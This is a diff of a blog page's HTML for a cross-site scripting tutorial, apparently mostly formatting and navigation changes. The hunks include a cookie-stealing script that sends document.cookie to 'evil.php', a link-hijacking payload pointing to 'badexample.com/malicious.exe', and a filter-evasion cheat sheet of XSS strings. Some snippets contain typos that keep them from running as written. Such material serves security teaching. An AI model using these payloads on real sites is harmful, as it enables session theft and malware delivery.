@@ -87,7 +87,7 @@
 <meta property="og:site_name" content="Lurking&#39;s Blog">
 <meta property="og:description" content="Common occurrences of vulnerabilitiesThe data is included in dynamic content(web request requently) that enters a Web application and then is sent to a web user.Typical examples  User/Profiles page Sh">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2018-09-24T15:54:29.516Z">
+<meta property="og:updated_time" content="2018-09-24T17:20:05.228Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Cross-site Scripting">
 <meta name="twitter:description" content="Common occurrences of vulnerabilitiesThe data is included in dynamic content(web request requently) that enters a Web application and then is sent to a web user.Typical examples  User/Profiles page Sh">
@@ -405,8 +405,8 @@
 <li><p>DOM XSS Attacks<br>DOM Based XSS is a form of XSS where the entire tainted data flow from source to sink takes place in the browser, i.e., the source of the data is in the DOM, the sink is also in the DOM, and the data flow never leaves the browser. For example, the source could be the URL of the page(e.g., document.location.href or the value of an element of the HTML), and the sink is sensitive method call that causes the execution of the malicious data(e.g., document.write).</p>
 </li>
 </ul>
-<h2 id="Use-of-Vulnerabilities"><a href="#Use-of-Vulnerabilities" class="headerlink" title="Use of Vulnerabilities"></a>Use of Vulnerabilities</h2><p><em>Cookie Grabber</em><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">Var adr = ‘../evil.php?cakemonster=’ + escape(document.cookie);</span><br><span class="line">var img = document.createElement(“img”);</span><br><span class="line">var d1 = document.getElementById(“d1”);</span><br><span class="line">img.src = adr;</span><br><span class="line">d1.appendChild(img);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
-<p><em>Download of malicious software</em><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/index.php?id=&lt;script&gt;window.onload = function() &#123;</span><br><span class="line">var AllLinks=document.getELementByTagName(&quot;a&quot;);</span><br><span class="line">AllLinks[0].href = &quot;http://badexample.com/malicious.exe&quot;;</span><br><span class="line">&#125;&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
+<h2 id="Use-of-Vulnerabilities"><a href="#Use-of-Vulnerabilities" class="headerlink" title="Use of Vulnerabilities"></a>Use of Vulnerabilities</h2><p><strong>Cookie Grabber</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">Var adr = ‘../evil.php?cakemonster=’ + escape(document.cookie);</span><br><span class="line">var img = document.createElement(“img”);</span><br><span class="line">var d1 = document.getElementById(“d1”);</span><br><span class="line">img.src = adr;</span><br><span class="line">d1.appendChild(img);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
+<p><strong>Download of malicious software</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/index.php?id=&lt;script&gt;window.onload = function() &#123;</span><br><span class="line">var AllLinks=document.getELementByTagName(&quot;a&quot;);</span><br><span class="line">AllLinks[0].href = &quot;http://badexample.com/malicious.exe&quot;;</span><br><span class="line">&#125;&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
 <h2 id="Testing-of-Cross-site-scripting"><a href="#Testing-of-Cross-site-scripting" class="headerlink" title="Testing of Cross site scripting"></a>Testing of Cross site scripting</h2><p><strong>Reflected XSS</strong><br><em>Black Box testing</em></p>
 <ul>
 <li><code>&lt;script&gt;alert(123)&lt;/script&gt;</code></li>
@@ -441,8 +441,7 @@
 </blockquote>
 <p>and so on.</p>
 <h2 id="XSS-Filter-Evasion-Cheat-Sheet"><a href="#XSS-Filter-Evasion-Cheat-Sheet" class="headerlink" title="XSS Filter Evasion Cheat Sheet"></a>XSS Filter Evasion Cheat Sheet</h2><p>Image tag<br><code>&lt;IMG SRC=&quot;javascript:alert(&#39;XSS&#39;);&quot;&gt;</code><br>No quotes and no semicolon<br><code>&lt;IMG SRC=javascript:alert(&#39;XSS&#39;)&gt;</code><br>Case insensitive<br><code>&lt;IMG SRC=JaVaScRiPt:alert(&#39;XSS&#39;)&gt;</code><br>HTML entities<br><code>&lt;IMG SRC=javascript:alert(&amp;quot;XSS&amp;quot;)&gt;</code><br>Grave accent obfuscation<br><code>&lt;IMG SRC=`javascript:alert(“RSnake says, ‘XSS’”)`&gt;</code><br>Malformed A tags<br><code>&lt;a onmouseover=&quot;alert(document.cookie)&quot;&gt;xxs link&lt;/a&gt;</code><br>Malformed IMG tags<br><code>&lt;IMG src=&quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&quot;&gt;</code><br>fromCharCode<br><code>&lt;script&gt;eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,13))&lt;/script&gt;</code></p>
-<p>To be continue</p>
-<h2 id="XSS-Prevention-Cheat-Sheet"><a href="#XSS-Prevention-Cheat-Sheet" class="headerlink" title="XSS Prevention Cheat Sheet"></a>XSS Prevention Cheat Sheet</h2>
+<h1 id="To-be-continue"><a href="#To-be-continue" class="headerlink" title="To be continue"></a>To be continue</h1><h2 id="XSS-Prevention-Cheat-Sheet"><a href="#XSS-Prevention-Cheat-Sheet" class="headerlink" title="XSS Prevention Cheat Sheet"></a>XSS Prevention Cheat Sheet</h2>
       
     </div>
     
@@ -481,6 +480,10 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/09/25/Command-Injection/" rel="prev" title="Command Injection">
+                Command Injection <i class="fa fa-chevron-right"></i>
+              </a>
             
           </div>
         </div>
@@ -561,7 +564,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-count">3</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -583,7 +586,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-count">3</span>
                   <span class="site-state-item-name">tags</span>
                 </a>
               </div>
@@ -616,7 +619,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Common-occurrences-of-vulnerabilities"><span class="nav-number">1.</span> <span class="nav-text">Common occurrences of vulnerabilities</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Type"><span class="nav-number">2.</span> <span class="nav-text">Type</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Use-of-Vulnerabilities"><span class="nav-number">3.</span> <span class="nav-text">Use of Vulnerabilities</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Testing-of-Cross-site-scripting"><span class="nav-number">4.</span> <span class="nav-text">Testing of Cross site scripting</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS-Filter-Evasion-Cheat-Sheet"><span class="nav-number">5.</span> <span class="nav-text">XSS Filter Evasion Cheat Sheet</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS-Prevention-Cheat-Sheet"><span class="nav-number">6.</span> <span class="nav-text">XSS Prevention Cheat Sheet</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Common-occurrences-of-vulnerabilities"><span class="nav-number">1.</span> <span class="nav-text">Common occurrences of vulnerabilities</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Type"><span class="nav-number">2.</span> <span class="nav-text">Type</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Use-of-Vulnerabilities"><span class="nav-number">3.</span> <span class="nav-text">Use of Vulnerabilities</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Testing-of-Cross-site-scripting"><span class="nav-number">4.</span> <span class="nav-text">Testing of Cross site scripting</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS-Filter-Evasion-Cheat-Sheet"><span class="nav-number">5.</span> <span class="nav-text">XSS Filter Evasion Cheat Sheet</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#To-be-continue"><span class="nav-number"></span> <span class="nav-text">To be continue</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS-Prevention-Cheat-Sheet"><span class="nav-number">1.</span> <span class="nav-text">XSS Prevention Cheat Sheet</span></a></li></ol></div>
             
 
           </div>
